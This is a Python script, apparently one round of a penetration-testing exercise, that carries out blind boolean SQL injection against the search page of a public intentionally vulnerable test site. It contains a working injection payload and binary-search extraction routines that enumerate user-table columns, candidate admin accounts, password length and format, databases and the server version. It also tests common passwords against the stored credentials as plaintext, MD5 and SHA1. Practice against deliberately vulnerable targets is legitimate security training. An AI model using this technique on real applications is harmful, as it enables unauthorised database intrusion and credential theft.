#!/usr/bin/env python3
"""Round 8b — 보강 추출: 정확한 행수, users 컬럼명 전량, 실계정 존재/비밀번호 형식,
DB 목록 + 접근권한, SQL Server 버전. 전부 읽기 전용 SELECT (search.asp bloc oracle)."""
import json, urllib.parse, urllib.request, urllib.error

BASE = "http://testasp.vulnweb.com/search.asp"
REQ = {"n": 0}


def oracle(cond):
    st = "zzq')>0 OR (" + cond + "))--"
    url = BASE + "?tfSearch=" + urllib.parse.quote(st, safe="")
    REQ["n"] += 1
    try:
        with urllib.request.urlopen(url, timeout=30) as r:
            return "class='posttext'" in r.read().decode("latin-1", "replace")
    except urllib.error.HTTPError as e:
        b = e.read().decode("latin-1", "replace")
        return None if e.code == 500 else ("class='posttext'" in b)
    except Exception:
        return None


def exact_int(expr, lo=0, hi=200000):
    if oracle(f"({expr})>={lo}") is not True:
        return None
    while lo < hi:
        mid = (lo + hi + 1) // 2
        r = oracle(f"({expr})>={mid}")
        if r is True:
            lo = mid
        elif r is False:
            hi = mid - 1
        else:
            return None
    return lo


def extract(expr, n):
    out = ""
    for i in range(1, n + 1):
        lo, hi = 1, 126
        while lo < hi:
            mid = (lo + hi) // 2
            r = oracle(f"(SELECT ASCII(SUBSTRING(({expr}),{i},1)))>{mid}")
            if r is True:
                lo = mid + 1
            elif r is False:
                hi = mid
            else:
                return out + "<?>"
        if lo <= 1:
            break
        out += chr(lo)
    return out


def sget(expr, cap=60):
    """NULL 이면 None, 아니면 문자열 반환"""
    if oracle(f"({expr}) IS NOT NULL") is not True:
        return None
    ln = exact_int(f"LEN({expr})", 1, cap)
    if not ln:
        return None
    return extract(expr, ln)


R = {"requests": 0}
print("### 1. users 정확한 행 수 / 실제 등록 흔적")
R["users_rows"] = exact_int("(SELECT COUNT(*) FROM users)", 0, 200000)
print("  users 행 수 =", R["users_rows"])
for lab, cond in [("email 컬럼에 '@' 포함 행 존재", "(SELECT COUNT(*) FROM users WHERE email LIKE '%@%')>0"),
                  ("uname 에 공백/특수문자 포함 행이 다수(>=100)",
                   "(SELECT COUNT(*) FROM users WHERE uname LIKE '% %' OR uname LIKE '%''%')>=100"),
                  ("upass 가 uname 과 같은 행 수 >= 10",
                   "(SELECT COUNT(*) FROM users WHERE upass=uname)>=10")]:
    v = oracle(cond); print(f"  {'TRUE ' if v else 'FALSE'}  {lab}")

print("\n### 2. users 컬럼명 전량 (sys.columns 순서대로)")
cols = []
for cid in range(1, 7):
    e = f"(SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('users') AND column_id={cid})"
    nm = sget(e, 40)
    print(f"  column_id={cid} → {nm!r}")
    if nm:
        cols.append(nm)
R["users_columns"] = cols

print("\n### 3. 애플리케이션 실계정 존재 여부 / 비밀번호 형식")
cands = ["admin", "administrator", "acunetix", "test", "guest", "user", "tom", "bob", "root"]
present = []
for u in cands:
    v = oracle(f"(SELECT COUNT(*) FROM users WHERE uname='{u}')>0")
    if v:
        present.append(u)
        ln = exact_int(f"(SELECT LEN(upass) FROM users WHERE uname='{u}')", 1, 100)
        hexish = oracle(f"(SELECT COUNT(*) FROM users WHERE uname='{u}' "
                        f"AND upass NOT LIKE '%[^0-9a-fA-F]%')>0")
        print(f"  ★ 존재: uname={u!r}  upass 길이={ln}  전부-헥스={hexish}")
        R.setdefault("real_accounts", []).append({"uname": u, "upass_len": ln, "upass_all_hex": hexish})
    else:
        print(f"  없음: {u!r}")
R["real_accounts_present"] = present

print("\n### 4. 실계정 비밀번호 후보 검증 (평문/해시 대조 — 값은 저장하지 않음)")
pw = ["admin", "password", "acunetix", "123456", "test", "admin123", "letmein", "qwerty"]
hits = []
for u in present:
    for p in pw:
        pl = oracle(f"(SELECT COUNT(*) FROM users WHERE uname='{u}' AND upass='{p}')>0")
        m5 = oracle(f"(SELECT COUNT(*) FROM users WHERE uname='{u}' AND "
                    f"UPPER(upass)=CONVERT(varchar(32),HASHBYTES('MD5','{p}'),2))>0")
        s1 = oracle(f"(SELECT COUNT(*) FROM users WHERE uname='{u}' AND "
                    f"UPPER(upass)=CONVERT(varchar(40),HASHBYTES('SHA1','{p}'),2))>0")
        if pl or m5 or s1:
            kind = "PLAINTEXT" if pl else ("MD5" if m5 else "SHA1")
            hits.append({"uname": u, "scheme": kind, "match": True})
            print(f"  ★ uname={u!r} 후보일치 방식={kind}  (비밀번호 값 미기록)")
R["credential_hits"] = hits
if not hits:
    print("  (일치 없음)")

print("\n### 5. DB 목록 + 접근 권한")
dbs = []
for n in range(1, 9):
    nm = sget(f"DB_NAME({n})", 40)
    if not nm:
        break
    acc = oracle(f"HAS_DBACCESS('{nm}')=1")
    dbs.append({"n": n, "name": nm, "has_dbaccess": acc})
    print(f"  DB_NAME({n}) = {nm!r}   HAS_DBACCESS={acc}")
R["databases"] = dbs

print("\n### 6. SQL Server 버전")
v = sget("CAST(SERVERPROPERTY('ProductVersion') AS varchar(50))", 40)
R["product_version"] = v
print("  ProductVersion =", v)
e = sget("CAST(SERVERPROPERTY('Edition') AS varchar(60))", 60)
R["edition"] = e
print("  Edition        =", e)

R["requests"] = REQ["n"]
with open("out/db_facts2.json", "w", encoding="utf-8") as f:
    json.dump(R, f, ensure_ascii=False, indent=2)
print(f"\n### 완료 — 총 요청 {REQ['n']}건 → out/db_facts2.json")
